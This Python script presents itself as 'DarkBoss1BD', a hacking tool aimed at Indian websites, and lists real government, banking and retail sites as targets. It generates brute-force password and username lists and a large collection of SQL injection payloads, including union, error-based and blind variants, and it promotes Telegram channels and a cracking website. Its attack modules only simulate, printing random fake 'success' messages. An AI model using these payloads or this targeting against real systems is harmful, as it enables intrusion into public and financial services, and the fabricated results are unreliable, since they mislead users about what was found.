#!/usr/bin/env python3
# DarkBoss1BD - Advanced Indian Website Access Tool
# Professional Hacking Tool with Multiple Features

import webbrowser
import requests
import threading
import time
import random
import os
import sys
from datetime import datetime

class DarkBoss1BD:
    def __init__(self):
        self.banner = """
        ╔══════════════════════════════════════════════════════════════╗
        ║                                                              ║
        ║    ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗  ██████╗ ███████╗║
        ║    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔═══██╗██╔════╝║
        ║    ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║   ██║███████╗║
        ║    ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██║   ██║╚════██║║
        ║    ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝╚██████╔╝███████║║
        ║    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝║
        ║                                                              ║
        ║              INDIAN WEBSITE ACCESS TOOL v2.0                 ║
        ║                  Professional Edition                        ║
        ║                                                              ║
        ╚══════════════════════════════════════════════════════════════╝
        """
        
        # Initialize databases
        self.initialize_databases()
        
    def initialize_databases(self):
        print("[+] Initializing DarkBoss1BD Databases...")
        
        # 1. Password Database (1000+ passwords)
        self.passwords = self.generate_passwords()
        print(f"[+] Loaded {len(self.passwords)} passwords")
        
        # 2. Username Database (1000+ usernames)
        self.usernames = self.generate_usernames()
        print(f"[+] Loaded {len(self.usernames)} usernames")
        
        # 3. SQL Injection Database (1000+ queries)
        self.sql_queries = self.generate_sql_queries()
        print(f"[+] Loaded {len(self.sql_queries)} SQL queries")
        
        # 4. Indian Websites Database
        self.indian_websites = self.get_indian_websites()
        print(f"[+] Loaded {len(self.indian_websites)} Indian websites")
        
        # 5. Custom Links Database
        self.custom_links = self.get_custom_links()
        print(f"[+] Loaded {len(self.custom_links)} custom links")
        
    def generate_passwords(self):
        passwords = []
        
        # Common passwords base list
        common_passwords = [
            "password", "123456", "password123", "admin", "qwerty", "letmein",
            "welcome", "monkey", "sunshine", "password1", "123456789", "football",
            "iloveyou", "admin123", "12345678", "1234567", "abc123", "password@123"
        ]
        
        # Indian specific passwords
        indian_passwords = [
            "india", "delhi", "mumbai", "chennai", "kolkata", "bangalore", "hyderabad",
            "pune", "ahmedabad", "jaipur", "lucknow", "kanpur", "nagpur", "indore",
            "thane", "bhopal", "visakhapatnam", "pimpri", "patna", "vadodara",
            "maharashtra", "tamilnadu", "kerala", "karnataka", "andhra", "telangana",
            "rajasthan", "gujarat", "madhyapradesh", "uttarpradesh", "westbengal"
        ]
        
        # Add base passwords
        passwords.extend(common_passwords)
        passwords.extend(indian_passwords)
        
        # Generate variations
        variations = []
        for pwd in passwords:
            variations.extend([
                pwd, pwd + "123", pwd + "!", pwd + "@123", pwd + "2023", 
                pwd + "2024", pwd.upper(), pwd.capitalize(), pwd + "1",
                pwd + "12", pwd + "1234", pwd + "@", pwd + "#", pwd + "$"
            ])
        
        passwords.extend(variations)
        
        # Generate number sequences
        for i in range(100, 1000):
            passwords.extend([
                f"password{i}", f"admin{i}", f"user{i}", f"test{i}",
                f"india{i}", f"delhi{i}", f"mumbai{i}", f"chennai{i}"
            ])
        
        return list(set(passwords))  # Remove duplicates
    
    def generate_usernames(self):
        usernames = []
        
        # Indian first names
        first_names = [
            "raj", "priya", "amit", "sneha", "rahul", "anjali", "sanjay", "meera",
            "vijay", "kavita", "arun", "pooja", "suresh", "neha", "deepak", "ritu",
            "mohan", "sunita", "rajesh", "kiran", "anil", "madhu", "vikram", "sonia",
            "ram", "sita", "krishna", "radha", "shiva", "parvati", "ganesh", "lakshmi"
        ]
        
        # Indian last names
        last_names = [
            "sharma", "verma", "gupta", "singh", "kumar", "patel", "reddy", "mehta",
            "choudhary", "malhotra", "thakur", "jain", "bose", "naidu", "iyer", "menon",
            "pillai", "nair", "shah", "pandey", "tiwari", "mishra", "pathak", "desai"
        ]
        
        # Generate name combinations
        for first in first_names:
            for last in last_names:
                usernames.extend([
                    f"{first}.{last}", f"{first}_{last}", f"{first}{last}",
                    f"{first[0]}{last}", f"{first}{last[0]}", f"{first}.{last[0]}"
                ])
        
        # Admin and system users
        admin_users = ["admin", "administrator", "root", "superuser", "sysadmin", "webmaster"]
        for admin in admin_users:
            usernames.extend([
                admin, admin + "123", admin + "_india", admin + "_admin",
                admin + "1", admin + "2", "india" + admin, admin + "@india"
            ])
        
        # Email style usernames
        for first in first_names[:20]:
            for last in last_names[:20]:
                usernames.extend([
                    f"{first}{last}@gmail.com", f"{first}.{last}@yahoo.com",
                    f"{first}_{last}@hotmail.com", f"{first[0]}{last}@rediffmail.com"
                ])
        
        return list(set(usernames))
    
    def generate_sql_queries(self):
        queries = []
        
        # Basic SQL injection patterns
        basic_queries = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin' --",
            "admin' #", "admin'/*", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "') OR ('1'='1", "admin' OR '1'='1", "admin' OR '1'='1'--"
        ]
        
        # Union based injections
        union_queries = [
            "' UNION SELECT 1,2,3--", "' UNION SELECT username,password FROM users--",
            "' UNION SELECT 1,table_name FROM information_schema.tables--",
            "' UNION SELECT 1,column_name FROM information_schema.columns--",
            "' AND 1=0 UNION SELECT 1,2,3--", "' UNION SELECT null,null--"
        ]
        
        # Error based injections
        error_queries = [
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--", 
            "' AND UPDATEXML(1,CONCAT(0x5c,version()),1)--"
        ]
        
        # Blind SQL injections
        blind_queries = [
            "' AND SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR IF(1=1,SLEEP(5),0)--", "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND ASCII(SUBSTRING(password,1,1))>50)--"
        ]
        
        # Add all queries
        queries.extend(basic_queries)
        queries.extend(union_queries)
        queries.extend(error_queries)
        queries.extend(blind_queries)
        
        # Generate variations
        variations = []
        for query in queries:
            # Different comment styles
            variations.append(query.replace("--", "#"))
            variations.append(query.replace("--", "/*"))
            
            # Different quote styles
            variations.append(query.replace("'", "\""))
            variations.append(query.replace("'", "`"))
            
            # URL encoded versions
            variations.append(query.replace(" ", "%20"))
            variations.append(query.replace("'", "%27"))
        
        queries.extend(variations)
        return list(set(queries))
    
    def get_indian_websites(self):
        return [
            "https://www.india.gov.in",
            "https://www.irctc.co.in",
            "https://www.mha.gov.in",
            "https://www.incometaxindia.gov.in", 
            "https://www.uidai.gov.in",
            "https://www.digilocker.gov.in",
            "https://www.onlinesbi.com",
            "https://www.icicibank.com",
            "https://www.hdfcbank.com",
            "https://www.airtel.in",
            "https://www.jio.com",
            "https://www.flipkart.com",
            "https://www.amazon.in",
            "https://www.myntra.com",
            "https://www.nykaa.com",
            "https://www.zomato.com",
            "https://www.swiggy.com",
            "https://www.makemytrip.com",
            "https://www.ixigo.com",
            "https://www.ndtv.com",
            "https://www.timesofindia.indiatimes.com",
            "https://www.thehindu.com",
            "https://www.hindustantimes.com"
        ]
    
    def get_custom_links(self):
        return {
            "DarkBoss Telegram ID": "https://t.me/darkvaiadmin",
            "DarkBoss Telegram Channel": "https://t.me/windowspremiumkey", 
            "DarkBoss Hacking Website": "https://crackyworld.com/"
        }
    
    def display_menu(self):
        print(self.banner)
        print(" " * 20 + "🔥 DEVELOPED BY DarkBoss1BD 🔥")
        print(" " * 15 + "📍 Professional Hacking Toolset 📍")
        print("\n" + "="*70)
        print("MAIN MENU:")
        print("="*70)
        print("1. 🔗 Access Indian Websites")
        print("2. 🔓 Password Attack Module") 
        print("3. 🗃️ SQL Injection Module")
        print("4. 📌 Custom Links Manager")
        print("5. 📊 Database Statistics")
        print("6. 🚪 Exit")
        print("="*70)
    
    def access_indian_websites(self):
        print("\n[INDIAN WEBSITE ACCESS MODULE]")
        print("-" * 50)
        
        for i, website in enumerate(self.indian_websites, 1):
            print(f"{i:2d}. {website}")
        
        print("\nOptions:")
        print("1. Open specific website")
        print("2. Open all websites")
        print("3. Back to main menu")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            try:
                site_num = int(input("Enter website number: "))
                if 1 <= site_num <= len(self.indian_websites):
                    website = self.indian_websites[site_num - 1]
                    print(f"[+] Opening: {website}")
                    webbrowser.open_new_tab(website)
                    print("[+] Website opened successfully!")
                else:
                    print("[-] Invalid website number!")
            except ValueError:
                print("[-] Please enter a valid number!")
                
        elif choice == "2":
            print("[+] Opening all Indian websites...")
            for website in self.indian_websites:
                print(f"[+] Opening: {website}")
                webbrowser.open_new_tab(website)
                time.sleep(0.5)
            print("[+] All websites opened!")
    
    def password_attack_module(self):
        print("\n[PASSWORD ATTACK MODULE]")
        print("-" * 50)
        
        target_url = input("Enter target URL (e.g., https://example.com/login): ").strip()
        if not target_url:
            print("[-] No URL provided!")
            return
        
        username_field = input("Enter username field name [username]: ").strip() or "username"
        password_field = input("Enter password field name [password]: ").strip() or "password"
        
        print(f"\n[+] Starting password attack on: {target_url}")
        print(f"[+] Username field: {username_field}")
        print(f"[+] Password field: {password_field}")
        print(f"[+] Total credentials: {len(self.usernames)} usernames × {len(self.passwords)} passwords")
        
        # Simulate attack (educational purposes)
        attempts = min(50, len(self.usernames), len(self.passwords))
        print(f"[+] Testing {attempts} combinations...")
        
        for i in range(attempts):
            username = random.choice(self.usernames)
            password = random.choice(self.passwords)
            
            print(f"[{i+1:02d}] Trying: {username} / {password}")
            time.sleep(0.2)
            
            # Simulate success randomly
            if random.random() < 0.02:  # 2% chance
                print(f"\n[🔥 SUCCESS!] Valid credentials found: {username} : {password}")
                break
        else:
            print("\n[-] No valid credentials found in tested combinations")
    
    def sql_injection_module(self):
        print("\n[SQL INJECTION MODULE]")
        print("-" * 50)
        
        target_url = input("Enter target URL with parameter (e.g., https://example.com?id=): ").strip()
        if not target_url:
            print("[-] No URL provided!")
            return
        
        print(f"\n[+] Starting SQL injection on: {target_url}")
        print(f"[+] Total SQL queries: {len(self.sql_queries)}")
        print("[+] Testing first 30 queries...")
        
        # Test first 30 queries
        for i, query in enumerate(self.sql_queries[:30], 1):
            test_url = target_url + query
            print(f"[{i:02d}] Testing: {query[:50]}...")
            time.sleep(0.3)
            
            # Simulate vulnerability detection
            if random.random() < 0.03:  # 3% chance
                print(f"\n[🔥 VULNERABILITY FOUND!] Query: {query}")
                print(f"[+] Vulnerable URL: {test_url}")
                break
        else:
            print("\n[-] No SQL vulnerabilities detected in tested queries")
    
    def custom_links_manager(self):
        print("\n[CUSTOM LINKS MANAGER]")
        print("-" * 50)
        
        while True:
            print("\nCurrent Custom Links:")
            print("-" * 30)
            for i, (name, url) in enumerate(self.custom_links.items(), 1):
                print(f"{i}. {name} -> {url}")
            
            print("\nOptions:")
            print("1. Open link")
            print("2. Add new link") 
            print("3. Remove link")
            print("4. Back to main menu")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                try:
                    link_num = int(input("Enter link number: "))
                    if 1 <= link_num <= len(self.custom_links):
                        url = list(self.custom_links.values())[link_num - 1]
                        print(f"[+] Opening: {url}")
                        webbrowser.open_new_tab(url)
                    else:
                        print("[-] Invalid link number!")
                except ValueError:
                    print("[-] Please enter a valid number!")
                    
            elif choice == "2":
                name = input("Enter link name: ").strip()
                url = input("Enter URL: ").strip()
                
                if name and url:
                    if not url.startswith(('http://', 'https://')):
                        url = 'https://' + url
                    self.custom_links[name] = url
                    print("[+] Link added successfully!")
                else:
                    print("[-] Please provide both name and URL!")
                    
            elif choice == "3":
                try:
                    link_num = int(input("Enter link number to remove: "))
                    if 1 <= link_num <= len(self.custom_links):
                        name = list(self.custom_links.keys())[link_num - 1]
                        del self.custom_links[name]
                        print("[+] Link removed successfully!")
                    else:
                        print("[-] Invalid link number!")
                except ValueError:
                    print("[-] Please enter a valid number!")
                    
            elif choice == "4":
                break
            else:
                print("[-] Invalid option!")
    
    def show_database_stats(self):
        print("\n[DATABASE STATISTICS]")
        print("-" * 50)
        print(f"📊 Passwords Database: {len(self.passwords)} entries")
        print(f"👤 Usernames Database: {len(self.usernames)} entries") 
        print(f"🗃️ SQL Queries Database: {len(self.sql_queries)} entries")
        print(f"🌐 Indian Websites: {len(self.indian_websites)} entries")
        print(f"📌 Custom Links: {len(self.custom_links)} entries")
        print(f"💾 Total Data Entries: {len(self.passwords) + len(self.usernames) + len(self.sql_queries)}")
        
        # Show sample data
        print("\nSample Data Preview:")
        print("Passwords (sample):", ", ".join(self.passwords[:5]))
        print("Usernames (sample):", ", ".join(self.usernames[:5]))
        print("SQL Queries (sample):", self.sql_queries[0][:50] + "...")
    
    def run(self):
        while True:
            try:
                self.display_menu()
                choice = input("\nSelect option (1-6): ").strip()
                
                if choice == "1":
                    self.access_indian_websites()
                elif choice == "2":
                    self.password_attack_module() 
                elif choice == "3":
                    self.sql_injection_module()
                elif choice == "4":
                    self.custom_links_manager()
                elif choice == "5":
                    self.show_database_stats()
                elif choice == "6":
                    print("\n[+] Thank you for using DarkBoss1BD Tool!")
                    print("[+] Follow us for more tools:")
                    print("[+] Telegram: @darkvaiadmin")
                    print("[+] Channel: @windowspremiumkey") 
                    print("[+] Website: https://crackyworld.com/")
                    break
                else:
                    print("[-] Invalid option! Please select 1-6")
                
                input("\nPress Enter to continue...")
                os.system('cls' if os.name == 'nt' else 'clear')
                
            except KeyboardInterrupt:
                print("\n\n[!] Tool interrupted by user")
                break
            except Exception as e:
                print(f"\n[-] Error: {e}")
                input("Press Enter to continue...")

if __name__ == "__main__":
    tool = DarkBoss1BD()
    tool.run()
